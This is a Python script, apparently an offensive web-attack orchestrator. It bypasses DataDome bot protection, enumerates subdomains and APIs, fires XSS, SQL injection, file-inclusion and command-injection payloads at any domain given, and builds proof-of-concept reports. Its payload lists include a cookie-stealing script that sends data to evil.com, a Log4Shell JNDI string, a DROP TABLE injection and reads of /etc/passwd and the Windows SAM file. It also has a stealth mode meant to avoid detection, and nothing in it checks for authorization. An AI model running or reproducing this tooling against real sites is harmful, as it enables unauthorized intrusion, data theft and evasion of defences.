#!/usr/bin/env python3
"""
Ultimate Web Application Security Hunter
Master orchestrator combining all advanced reconnaissance, bypass, and exploitation techniques
"""

import asyncio
import aiohttp
import json
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import hashlib
import uuid
from urllib.parse import urlparse, urljoin, quote
import base64
import ssl

# Import our advanced modules
from enhanced_datadome_bypass import EnhancedDataDomeBypass
from subdomain_exposure_hunter import SubdomainExposureHunter  
from api_data_exposure_hunter import APIDataExposureHunter

class UltimateWebHunter:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.bypass_engine = EnhancedDataDomeBypass()
        self.subdomain_hunter = SubdomainExposureHunter()
        self.api_hunter = APIDataExposureHunter()
        
        self.results = {
            'target': '',
            'timestamp': datetime.now().isoformat(),
            'phase_results': {},
            'critical_findings': [],
            'all_discoveries': [],
            'bypass_status': {},
            'exploitation_evidence': []
        }
        
        # Advanced payloads for various attack vectors
        self.advanced_payloads = {
            'xss': [
                '<script>alert(document.domain)</script>',
                '"><script>alert(document.domain)</script>',
                "javascript:alert(document.domain)",
                '<img src=x onerror=alert(document.domain)>',
                '<svg onload=alert(document.domain)>',
                '${alert(document.domain)}',
                '{{alert(document.domain)}}',
                '<script>fetch("http://evil.com/?c="+btoa(document.cookie))</script>'
            ],
            'sqli': [
                "' OR 1=1--",
                "1' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1 LIMIT 1--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' AND (SELECT user())='root'@'localhost'--"
            ],
            'idor': [
                '../admin',
                '../../etc/passwd',
                '../../../windows/system32/drivers/etc/hosts',
                'user/1/admin',
                'profile/0',
                'api/users/1',
                'data/sensitive.json'
            ],
            'lfi': [
                '../../../../etc/passwd',
                '../../../../windows/system32/drivers/etc/hosts',
                '..\\..\\..\\..\\windows\\system32\\config\\sam',
                'php://filter/convert.base64-encode/resource=index.php',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
                'file:///etc/passwd'
            ],
            'rce': [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(whoami)',
                '; cat /etc/passwd',
                '| dir',
                '; type C:\\windows\\system32\\drivers\\etc\\hosts',
                '${jndi:ldap://evil.com/a}'
            ]
        }
        
        # File extensions and paths for sensitive file discovery
        self.sensitive_paths = [
            '.env', '.git/config', 'config.json', 'database.yml',
            'wp-config.php', 'settings.py', 'application.properties',
            'web.config', '.htaccess', 'phpinfo.php', 'info.php',
            'admin', 'login', 'dashboard', 'panel', 'manager',
            'backup.sql', 'dump.sql', 'database.backup',
            'credentials.txt', 'passwords.txt', 'keys.txt'
        ]

    async def phase_1_intelligence_gathering(self, target):
        """Phase 1: Comprehensive intelligence gathering"""
        print(f"[+] Phase 1: Advanced Intelligence Gathering on {target}")
        
        # Subdomain discovery with data exposure detection
        print("    [*] Running advanced subdomain discovery...")
        subdomain_results = self.subdomain_hunter.hunt_subdomains(target, max_threads=25, timeout=8)
        
        # API endpoint discovery  
        print("    [*] Discovering API endpoints...")
        api_results = self.api_hunter.hunt_api_endpoints(target, max_endpoints=1000, max_threads=15)
        
        self.results['phase_results']['intelligence'] = {
            'subdomains': subdomain_results,
            'api_endpoints': api_results,
            'total_assets': len(subdomain_results.get('subdomains', [])) + len(api_results.get('endpoints', []))
        }
        
        return self.results['phase_results']['intelligence']

    async def phase_2_protection_analysis(self, target):
        """Phase 2: Security protection analysis and bypass"""
        print(f"[+] Phase 2: Security Protection Analysis and Bypass")
        
        test_endpoints = [
            f"https://{target}/",
            f"https://api.{target}/",
            f"https://www.{target}/api/",
            f"https://{target}/graphql",
            f"https://admin.{target}/"
        ]
        
        bypass_results = {}
        
        for endpoint in test_endpoints:
            print(f"    [*] Testing protection bypass on {endpoint}")
            try:
                results = self.bypass_engine.test_all_techniques(endpoint)
                successful_bypasses = [r for r in results if r.get('success')]
                
                bypass_results[endpoint] = {
                    'total_techniques': len(results),
                    'successful_bypasses': len(successful_bypasses),
                    'bypass_methods': [r['technique'] for r in successful_bypasses],
                    'accessible': len(successful_bypasses) > 0
                }
                
                if successful_bypasses:
                    print(f"    [!] BYPASS SUCCESS: {endpoint} - {len(successful_bypasses)} methods work")
                    
            except Exception as e:
                bypass_results[endpoint] = {'error': str(e), 'accessible': False}
        
        self.results['phase_results']['protection_bypass'] = bypass_results
        self.results['bypass_status'] = bypass_results
        
        return bypass_results

    async def phase_3_vulnerability_hunting(self, target):
        """Phase 3: Advanced vulnerability discovery and testing"""
        print(f"[+] Phase 3: Advanced Vulnerability Hunting")
        
        vulnerabilities = []
        
        # Get working session from bypass if available
        working_session = None
        if hasattr(self.bypass_engine, 'success_headers') and self.bypass_engine.success_headers:
            working_session = self.bypass_engine.get_working_session()
        
        # Test for various vulnerability types
        vuln_tests = [
            self._test_xss_vulnerabilities,
            self._test_sql_injection,
            self._test_idor_vulnerabilities,
            self._test_lfi_vulnerabilities,
            self._test_rce_vulnerabilities,
            self._test_sensitive_file_exposure,
            self._test_authentication_bypass,
            self._test_authorization_flaws
        ]
        
        for test_func in vuln_tests:
            try:
                print(f"    [*] Running {test_func.__name__.replace('_test_', '').replace('_', ' ').title()}")
                results = await test_func(target, working_session)
                if results:
                    vulnerabilities.extend(results)
                    
            except Exception as e:
                print(f"    [!] Error in {test_func.__name__}: {e}")
        
        self.results['phase_results']['vulnerabilities'] = vulnerabilities
        
        # Classify critical findings
        critical = [v for v in vulnerabilities if v.get('severity') in ['Critical', 'High']]
        self.results['critical_findings'] = critical
        
        print(f"    [+] Found {len(vulnerabilities)} total vulnerabilities ({len(critical)} critical)")
        
        return vulnerabilities

    async def _test_xss_vulnerabilities(self, target, session=None):
        """Test for XSS vulnerabilities"""
        xss_findings = []
        
        # Common XSS testing endpoints
        xss_endpoints = [
            f"https://{target}/search?q=PAYLOAD",
            f"https://{target}/search.php?term=PAYLOAD",
            f"https://www.{target}/search?query=PAYLOAD",
            f"https://{target}/comment?text=PAYLOAD",
            f"https://api.{target}/search?q=PAYLOAD"
        ]
        
        for endpoint_template in xss_endpoints:
            for payload in self.advanced_payloads['xss'][:3]:  # Test top 3 payloads
                try:
                    test_url = endpoint_template.replace('PAYLOAD', quote(payload))
                    
                    if session:
                        response = session.get(test_url, timeout=10)
                    else:
                        async with self.session.get(test_url, timeout=10) as response:
                            content = await response.text()
                    
                    # Check if payload is reflected
                    if payload in content and response.status == 200:
                        xss_findings.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f'Payload reflected in response (status: {response.status})',
                            'impact': 'Session hijacking, data theft, account takeover'
                        })
                        
                    await asyncio.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    continue
        
        return xss_findings

    async def _test_sql_injection(self, target, session=None):
        """Test for SQL injection vulnerabilities"""
        sqli_findings = []
        
        # Common SQL injection test endpoints
        sqli_endpoints = [
            f"https://{target}/product?id=PAYLOAD",
            f"https://{target}/user.php?id=PAYLOAD", 
            f"https://www.{target}/search?category=PAYLOAD",
            f"https://api.{target}/user/PAYLOAD",
            f"https://{target}/login?username=admin&password=PAYLOAD"
        ]
        
        for endpoint_template in sqli_endpoints:
            for payload in self.advanced_payloads['sqli'][:3]:
                try:
                    test_url = endpoint_template.replace('PAYLOAD', quote(payload))
                    
                    start_time = time.time()
                    
                    if session:
                        response = session.get(test_url, timeout=10)
                        content = response.text
                        status = response.status_code
                    else:
                        async with self.session.get(test_url, timeout=10) as response:
                            content = await response.text()
                            status = response.status
                    
                    response_time = time.time() - start_time
                    
                    # Check for SQL error messages
                    sql_errors = ['mysql_fetch_array', 'ORA-', 'Microsoft OLE DB', 'SQLServer JDBC Driver', 
                                 'PostgreSQL query failed', 'Warning: mysql_', 'valid MySQL result',
                                 'MySQLSyntaxErrorException', 'SQLException']
                    
                    found_error = any(error.lower() in content.lower() for error in sql_errors)
                    
                    # Check for time-based SQLi (response time > 5 seconds indicates potential time delay)
                    time_based = response_time > 5 and 'SLEEP' in payload.upper()
                    
                    if found_error or time_based:
                        sqli_findings.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f'SQL error detected' if found_error else f'Time delay: {response_time:.2f}s',
                            'impact': 'Database access, data extraction, potential server compromise'
                        })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    continue
        
        return sqli_findings

    async def _test_idor_vulnerabilities(self, target, session=None):
        """Test for IDOR (Insecure Direct Object Reference) vulnerabilities"""
        idor_findings = []
        
        # Test IDOR on various endpoints
        idor_endpoints = [
            f"https://{target}/user/1",
            f"https://api.{target}/profile/123",
            f"https://{target}/document/456",
            f"https://www.{target}/order/789"
        ]
        
        for endpoint in idor_endpoints:
            try:
                # Test original request
                if session:
                    response1 = session.get(endpoint, timeout=10)
                    status1, content1 = response1.status_code, response1.text
                else:
                    async with self.session.get(endpoint, timeout=10) as response:
                        status1 = response.status
                        content1 = await response.text()
                
                if status1 == 200:
                    # Test with different IDs
                    for test_id in ['0', '2', '999', 'admin']:
                        test_url = endpoint.rsplit('/', 1)[0] + '/' + test_id
                        
                        if session:
                            response2 = session.get(test_url, timeout=10)
                            status2, content2 = response2.status_code, response2.text
                        else:
                            async with self.session.get(test_url, timeout=10) as response:
                                status2 = response.status
                                content2 = await response.text()
                        
                        # Check if we get different but valid responses
                        if status2 == 200 and content1 != content2 and len(content2) > 100:
                            idor_findings.append({
                                'type': 'Insecure Direct Object Reference (IDOR)',
                                'severity': 'High',
                                'url': test_url,
                                'payload': test_id,
                                'evidence': f'Different user data accessible (Original: {len(content1)} chars, Modified: {len(content2)} chars)',
                                'impact': 'Unauthorized access to other users data'
                            })
                        
                        await asyncio.sleep(0.3)
                
            except Exception as e:
                continue
        
        return idor_findings

    async def _test_lfi_vulnerabilities(self, target, session=None):
        """Test for Local File Inclusion vulnerabilities"""
        lfi_findings = []
        
        lfi_endpoints = [
            f"https://{target}/page?file=PAYLOAD",
            f"https://{target}/include.php?page=PAYLOAD",
            f"https://www.{target}/template?name=PAYLOAD"
        ]
        
        for endpoint_template in lfi_endpoints:
            for payload in self.advanced_payloads['lfi'][:3]:
                try:
                    test_url = endpoint_template.replace('PAYLOAD', quote(payload))
                    
                    if session:
                        response = session.get(test_url, timeout=10)
                        content = response.text
                    else:
                        async with self.session.get(test_url, timeout=10) as response:
                            content = await response.text()
                    
                    # Check for common file indicators
                    lfi_indicators = ['root:x:0:0:', 'daemon:', '[boot loader]', 'www-data:', '/bin/bash']
                    
                    if any(indicator in content for indicator in lfi_indicators):
                        lfi_findings.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'evidence': 'System file contents detected in response',
                            'impact': 'File system access, potential remote code execution'
                        })
                    
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    continue
        
        return lfi_findings

    async def _test_rce_vulnerabilities(self, target, session=None):
        """Test for Remote Code Execution vulnerabilities"""
        rce_findings = []
        
        rce_endpoints = [
            f"https://{target}/cmd?command=PAYLOAD",
            f"https://{target}/exec.php?cmd=PAYLOAD",
            f"https://api.{target}/system?exec=PAYLOAD"
        ]
        
        for endpoint_template in rce_endpoints:
            for payload in self.advanced_payloads['rce'][:2]:  # Test fewer RCE payloads
                try:
                    test_url = endpoint_template.replace('PAYLOAD', quote(payload))
                    
                    if session:
                        response = session.get(test_url, timeout=10)
                        content = response.text
                    else:
                        async with self.session.get(test_url, timeout=10) as response:
                            content = await response.text()
                    
                    # Check for command execution indicators
                    rce_indicators = ['uid=', 'gid=', 'groups=', 'total ', 'Volume in drive', 'Directory of']
                    
                    if any(indicator in content for indicator in rce_indicators):
                        rce_findings.append({
                            'type': 'Remote Code Execution (RCE)',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'evidence': 'Command execution output detected',
                            'impact': 'Complete server compromise, data breach'
                        })
                    
                    await asyncio.sleep(1.0)  # Longer delay for RCE testing
                    
                except Exception as e:
                    continue
        
        return rce_findings

    async def _test_sensitive_file_exposure(self, target, session=None):
        """Test for sensitive file exposure"""
        file_findings = []
        
        for path in self.sensitive_paths:
            try:
                test_url = f"https://{target}/{path}"
                
                if session:
                    response = session.get(test_url, timeout=10)
                    status, content = response.status_code, response.text
                else:
                    async with self.session.get(test_url, timeout=10) as response:
                        status = response.status
                        content = await response.text()
                
                if status == 200 and len(content) > 50:
                    # Check for sensitive content indicators
                    sensitive_indicators = {
                        'database': ['password', 'host', 'username', 'db_'],
                        'config': ['secret', 'key', 'token', 'api_'],
                        'credentials': ['password', 'username', 'login', 'auth'],
                        'system': ['version', 'server', 'path', 'root']
                    }
                    
                    found_types = []
                    for file_type, indicators in sensitive_indicators.items():
                        if any(indicator.lower() in content.lower() for indicator in indicators):
                            found_types.append(file_type)
                    
                    if found_types:
                        file_findings.append({
                            'type': 'Sensitive File Exposure',
                            'severity': 'Medium' if 'credentials' not in found_types else 'High',
                            'url': test_url,
                            'payload': path,
                            'evidence': f'Exposed {", ".join(found_types)} information ({len(content)} chars)',
                            'impact': 'Information disclosure, potential credential exposure'
                        })
                
                await asyncio.sleep(0.3)
                
            except Exception as e:
                continue
        
        return file_findings

    async def _test_authentication_bypass(self, target, session=None):
        """Test for authentication bypass vulnerabilities"""
        auth_findings = []
        
        # Authentication bypass test cases
        bypass_tests = [
            {'url': f"https://{target}/admin", 'headers': {'X-Forwarded-For': '127.0.0.1'}},
            {'url': f"https://{target}/admin", 'headers': {'X-Real-IP': '127.0.0.1'}},
            {'url': f"https://{target}/admin/../admin", 'headers': {}},
            {'url': f"https://{target}/admin%2e%2e/admin", 'headers': {}},
            {'url': f"https://{target}/admin", 'headers': {'User-Agent': 'GoogleBot'}},
        ]
        
        for test in bypass_tests:
            try:
                if session:
                    response = session.get(test['url'], headers=test['headers'], timeout=10)
                    status, content = response.status_code, response.text
                else:
                    async with self.session.get(test['url'], headers=test['headers'], timeout=10) as response:
                        status = response.status
                        content = await response.text()
                
                # Check if we bypassed authentication (got 200 instead of 401/403)
                if status == 200 and any(indicator in content.lower() for indicator in ['admin', 'dashboard', 'panel', 'management']):
                    auth_findings.append({
                        'type': 'Authentication Bypass',
                        'severity': 'High',
                        'url': test['url'],
                        'payload': str(test['headers']),
                        'evidence': f'Admin panel accessible without authentication (status: {status})',
                        'impact': 'Unauthorized administrative access'
                    })
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                continue
        
        return auth_findings

    async def _test_authorization_flaws(self, target, session=None):
        """Test for authorization flaws"""
        authz_findings = []
        
        # Test authorization on common endpoints
        authz_endpoints = [
            f"https://api.{target}/admin/users",
            f"https://{target}/api/admin/settings",
            f"https://www.{target}/admin/config",
            f"https://{target}/internal/status"
        ]
        
        for endpoint in authz_endpoints:
            try:
                if session:
                    response = session.get(endpoint, timeout=10)
                    status, content = response.status_code, response.text
                else:
                    async with self.session.get(endpoint, timeout=10) as response:
                        status = response.status
                        content = await response.text()
                
                # Check if sensitive admin functions are accessible
                if status == 200 and len(content) > 100:
                    admin_indicators = ['users', 'config', 'admin', 'settings', 'management']
                    if any(indicator in content.lower() for indicator in admin_indicators):
                        authz_findings.append({
                            'type': 'Authorization Flaw',
                            'severity': 'High',
                            'url': endpoint,
                            'payload': 'Direct access',
                            'evidence': f'Administrative functionality accessible without proper authorization',
                            'impact': 'Unauthorized access to administrative functions'
                        })
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                continue
        
        return authz_findings

    async def phase_4_exploitation_poc(self, target):
        """Phase 4: Generate proof-of-concept exploits"""
        print(f"[+] Phase 4: Exploitation Proof-of-Concept Generation")
        
        exploitation_evidence = []
        
        # Generate PoCs for discovered vulnerabilities
        for vulnerability in self.results.get('critical_findings', []):
            try:
                poc = await self._generate_poc(vulnerability)
                if poc:
                    exploitation_evidence.append(poc)
                    print(f"    [+] Generated PoC for {vulnerability['type']}")
                    
            except Exception as e:
                print(f"    [!] Error generating PoC: {e}")
        
        self.results['exploitation_evidence'] = exploitation_evidence
        return exploitation_evidence

    async def _generate_poc(self, vulnerability):
        """Generate proof-of-concept for a vulnerability"""
        vuln_type = vulnerability['type']
        
        poc_templates = {
            'Cross-Site Scripting (XSS)': {
                'description': 'XSS vulnerability allows execution of arbitrary JavaScript',
                'steps': [
                    f"1. Navigate to {vulnerability['url']}",
                    f"2. Payload '{vulnerability['payload']}' executes JavaScript",
                    "3. User sessions can be hijacked via document.cookie access"
                ],
                'impact': 'Session hijacking, credential theft, defacement',
                'curl_command': f"curl -X GET '{vulnerability['url']}'"
            },
            'SQL Injection': {
                'description': 'SQL injection allows database manipulation',
                'steps': [
                    f"1. Navigate to {vulnerability['url']}",
                    f"2. Inject payload: {vulnerability['payload']}",
                    "3. Database responds with error/data, confirming injection"
                ],
                'impact': 'Database access, data extraction, potential RCE',
                'curl_command': f"curl -X GET '{vulnerability['url']}'"
            },
            'Insecure Direct Object Reference (IDOR)': {
                'description': 'IDOR allows access to unauthorized resources',
                'steps': [
                    f"1. Access legitimate resource",
                    f"2. Modify parameter to: {vulnerability['payload']}",
                    "3. Gain access to other users' data"
                ],
                'impact': 'Unauthorized data access, privacy violation',
                'curl_command': f"curl -X GET '{vulnerability['url']}'"
            }
        }
        
        template = poc_templates.get(vuln_type, {
            'description': f'Vulnerability of type {vuln_type}',
            'steps': ['Manual testing required'],
            'impact': vulnerability.get('impact', 'Unknown'),
            'curl_command': f"curl -X GET '{vulnerability['url']}'"
        })
        
        return {
            'vulnerability_id': hashlib.md5(f"{vuln_type}{vulnerability['url']}".encode()).hexdigest()[:8],
            'type': vuln_type,
            'severity': vulnerability['severity'],
            'url': vulnerability['url'],
            'poc': template,
            'timestamp': datetime.now().isoformat()
        }

    async def generate_final_report(self):
        """Generate comprehensive final report"""
        print("[+] Generating comprehensive final report...")
        
        total_findings = len(self.results.get('critical_findings', []))
        critical_count = len([v for v in self.results.get('critical_findings', []) if v.get('severity') == 'Critical'])
        
        report = {
            'executive_summary': {
                'target': self.results['target'],
                'assessment_date': self.results['timestamp'],
                'total_vulnerabilities': total_findings,
                'critical_vulnerabilities': critical_count,
                'bypass_success_rate': self._calculate_bypass_success_rate(),
                'overall_risk_level': 'Critical' if critical_count > 0 else 'High' if total_findings > 0 else 'Medium'
            },
            'detailed_findings': self.results.get('critical_findings', []),
            'technical_details': {
                'intelligence_gathering': self.results['phase_results'].get('intelligence', {}),
                'protection_bypass': self.results['phase_results'].get('protection_bypass', {}),
                'vulnerability_testing': self.results['phase_results'].get('vulnerabilities', [])
            },
            'exploitation_evidence': self.results.get('exploitation_evidence', []),
            'recommendations': self._generate_recommendations()
        }
        
        return report

    def _calculate_bypass_success_rate(self):
        """Calculate bot protection bypass success rate"""
        bypass_results = self.results.get('bypass_status', {})
        if not bypass_results:
            return 0
        
        successful = sum(1 for result in bypass_results.values() if result.get('accessible', False))
        total = len(bypass_results)
        
        return (successful / total * 100) if total > 0 else 0

    def _generate_recommendations(self):
        """Generate security recommendations based on findings"""
        recommendations = [
            "Implement input validation and output encoding",
            "Use parameterized queries to prevent SQL injection",
            "Implement proper access controls and authorization checks",
            "Deploy Web Application Firewall (WAF)",
            "Regular security assessments and code reviews",
            "Implement Content Security Policy (CSP)",
            "Use secure session management",
            "Deploy bot protection and rate limiting"
        ]
        
        return recommendations

async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Ultimate Web Application Security Hunter')
    parser.add_argument('target', help='Target domain to test')
    parser.add_argument('--phases', default='1,2,3,4', help='Phases to run (1-4)')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slower but less detectable)')
    
    args = parser.parse_args()
    
    # Remove protocol if provided
    target = args.target.replace('https://', '').replace('http://', '')
    phases = [int(p) for p in args.phases.split(',')]
    
    hunter = UltimateWebHunter()
    hunter.results['target'] = target
    
    print(f"{'='*70}")
    print("🚀 ULTIMATE WEB APPLICATION SECURITY HUNTER")
    print(f"{'='*70}")
    print(f"Target: {target}")
    print(f"Phases: {phases}")
    print(f"Stealth Mode: {args.stealth}")
    print()
    
    try:
        # Phase 1: Intelligence Gathering
        if 1 in phases:
            await hunter.phase_1_intelligence_gathering(target)
            if args.stealth:
                await asyncio.sleep(random.uniform(5.0, 10.0))
        
        # Phase 2: Protection Analysis & Bypass  
        if 2 in phases:
            await hunter.phase_2_protection_analysis(target)
            if args.stealth:
                await asyncio.sleep(random.uniform(10.0, 20.0))
        
        # Phase 3: Vulnerability Hunting
        if 3 in phases:
            await hunter.phase_3_vulnerability_hunting(target)
            if args.stealth:
                await asyncio.sleep(random.uniform(5.0, 15.0))
        
        # Phase 4: Exploitation PoC
        if 4 in phases:
            await hunter.phase_4_exploitation_poc(target)
        
        # Generate final report
        final_report = await hunter.generate_final_report()
        
        print(f"\n{'='*70}")
        print("📊 ULTIMATE SECURITY ASSESSMENT COMPLETE")
        print(f"{'='*70}")
        
        summary = final_report['executive_summary']
        print(f"Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print(f"Critical Vulnerabilities: {summary['critical_vulnerabilities']}")
        print(f"Bypass Success Rate: {summary['bypass_success_rate']:.1f}%")
        print(f"Overall Risk Level: {summary['overall_risk_level']}")
        
        if final_report['detailed_findings']:
            print(f"\n🚨 CRITICAL FINDINGS:")
            for i, finding in enumerate(final_report['detailed_findings'][:5], 1):
                print(f"  {i}. {finding['type']} - {finding['severity']}")
                print(f"     URL: {finding['url']}")
                print(f"     Impact: {finding['impact']}")
                print()
        
        # Save results
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(final_report, f, indent=2)
            print(f"[+] Complete report saved to {args.output}")
        
    except KeyboardInterrupt:
        print("\n[!] Assessment interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during assessment: {e}")
    finally:
        await hunter.session.close()

if __name__ == '__main__':
    asyncio.run(main())